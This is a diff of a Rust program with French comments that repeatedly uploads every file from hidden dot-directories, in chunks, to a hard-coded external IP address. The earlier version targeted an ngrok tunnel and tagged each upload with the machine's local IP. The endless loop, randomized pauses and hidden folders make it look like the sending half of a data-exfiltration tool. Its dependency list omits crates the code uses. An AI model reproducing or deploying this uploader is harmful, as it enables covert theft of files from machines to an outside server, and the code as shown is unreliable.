@@ -1,89 +1,96 @@
+// Cargo.toml
+// [package]
+// name = "chunked_sender"
+// version = "0.1.0"
+// edition = "2021"
+//
+// [dependencies]
+// reqwest = { version = "0.11", features = ["blocking"] }
+// anyhow = "1.0"
+
+use anyhow::Result;
+use std::io::Write;
+use rand::{thread_rng, Rng};
+use reqwest::blocking::Client;
 use std::{
     fs::{self, File},
-    io::{Read, Write},
-    net::UdpSocket,
+    io::Read,
     path::Path,
     thread,
     time::Duration,
 };
 
-use std::net::TcpStream;
+const SERVER_URL: &str = "http://144.172.84.133:80"; // 👉 change à ton URL/ngrok
+const CHUNK_SIZE: usize = 1024 * 1024; // 1 Mo
 
-fn get_local_ip() -> String {
-    // Simple astuce pour récupérer l'IP locale en UDP (sans envoyer de données)
-    let socket = UdpSocket::bind("0.0.0.0:0").expect("Erreur bind");
-    socket.connect("8.8.8.8:80").expect("Erreur connect");
-    socket.local_addr().unwrap().ip().to_string()
-}
+fn send_file_in_chunks(client: &Client, file_path: &Path) -> Result<()> {
+    let mut file = File::open(file_path)?;
+    let mut buffer = Vec::new();
+    file.read_to_end(&mut buffer)?;
 
-fn send_file_http(file_path: &Path, server: &str) {
-    let ip = get_local_ip();
-    let file_name = file_path
-        .file_name()
-        .unwrap_or_default()
-        .to_string_lossy()
-        .into_owned();
+    let total_chunks = (buffer.len() + CHUNK_SIZE - 1) / CHUNK_SIZE;
+    let filename = file_path.file_name().unwrap().to_string_lossy();
 
-    let mut file = File::open(file_path).expect("Erreur d'ouverture fichier");
-    let mut file_buffer = Vec::new();
-    file.read_to_end(&mut file_buffer).unwrap();
+    for idx in 0..total_chunks {
+        let start = idx * CHUNK_SIZE;
+        let end = (start + CHUNK_SIZE).min(buffer.len());
+        let chunk = &buffer[start..end];
 
-    // Format : ip\nnomfichier\n<contenu>
-    let mut payload = Vec::new();
-    payload.extend_from_slice(ip.as_bytes());
-    payload.push(b'\n');
-    payload.extend_from_slice(file_name.as_bytes());
-    payload.push(b'\n');
-    payload.extend_from_slice(&file_buffer);
+        let resp = client
+            .post(SERVER_URL)
+            .header("X-Filename", filename.to_string())
+            .header("X-Segment-Number", idx.to_string())
+            .header("X-Total-Segments", total_chunks.to_string())
+            .body(chunk.to_vec())
+            .send()?;
 
-    let request = format!(
-        "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\n\r\n",
-        server,
-        payload.len()
-    );
+        if resp.status().is_success() {
+            println!("✔️  Chunk {}/{} envoyé pour {}", idx + 1, total_chunks, filename);
+        } else {
+            eprintln!("❌  Erreur chunk {}/{}: {}", idx + 1, total_chunks, resp.status());
+        }
 
-    let mut stream = TcpStream::connect((server, 80)).expect("Connexion échouée");
-    stream.write_all(request.as_bytes()).unwrap();
-    stream.write_all(&payload).unwrap();
-
-    println!("📤 Envoyé : {} ({})", file_name, ip);
-}
-
-fn send_dir_http(dir_path: &str, server: &str) {
-    let path = Path::new(dir_path);
-
-    if !path.exists() || !path.is_dir() {
-        println!("📂 Dossier non trouvé : {}", dir_path);
-        return;
+        // petite pause pour ne pas spammer
+        thread::sleep(Duration::from_millis(200));
     }
 
-    for entry in fs::read_dir(path).unwrap() {
-        let entry = match entry {
-            Ok(e) => e,
-            Err(_) => continue,
-        };
+    Ok(())
+}
 
-        let file_path = entry.path();
-        if file_path.is_file() {
-            send_file_http(&file_path, server);
+fn send_dir(dir: &str) -> Result<()> {
+    let entries = fs::read_dir(dir)?;
+    let client = Client::new();
+
+    for entry in entries {
+        let path = entry?.path();
+        if path.is_file() {
+            send_file_in_chunks(&client, &path)?;
         }
     }
+
+    Ok(())
 }
 
-fn main() {
-    let output_dir = "output";
-    let output_file_dir = "output_files";
-    let output_file = "output_files/fichier.txt";
-    let server_domain = "https://d42b-2602-fa59-4-2f3-00-1.ngrok-free.app/"; // Remplace par celle donnée par ngrok
+fn main() -> Result<()> {
+    // Dossier à envoyer
+    let output_dir = ".output";
+    let output_file_dir = ".output_files";
+    let output_file = ".output_files/fichier.txt";
 
+    // On peut appeler send_dir dans une boucle infinie si besoin
     loop {
+        println!("🚀 Démarrage d'un nouvel envoi à {:?}", chrono::Local::now());
+        
+        if let Err(e) = send_dir(output_dir) {
+            eprintln!("⚠️  Erreur d'envoi : {:?}", e);
+        }
+
+        if let Err(e) = send_dir(output_file_dir) {
+            eprintln!("⚠️  Erreur d'envoi : {:?}", e);
+        }
+
+        // recréer dossier et/ou fichier si besoin...
         thread::sleep(Duration::from_secs(5));
-
-        println!("🚀 Envoi en cours...");
-        send_dir_http(output_dir, server_domain);
-        send_dir_http(output_file_dir, server_domain);
-        println!("✅ Envois terminés.");
-
         fs::create_dir_all(output_file_dir).ok();
         fs::create_dir_all(output_dir).ok();
 
@@ -97,5 +104,9 @@ fn main() {
                 Err(_) => println!("⚠️ Erreur lors de la création du fichier."),
             }
         }
+
+        let pause = thread_rng().gen_range(10..15);
+        println!("⏸️ Pause de {} secondes...", pause);
+        thread::sleep(Duration::from_secs(pause));
     }
 }
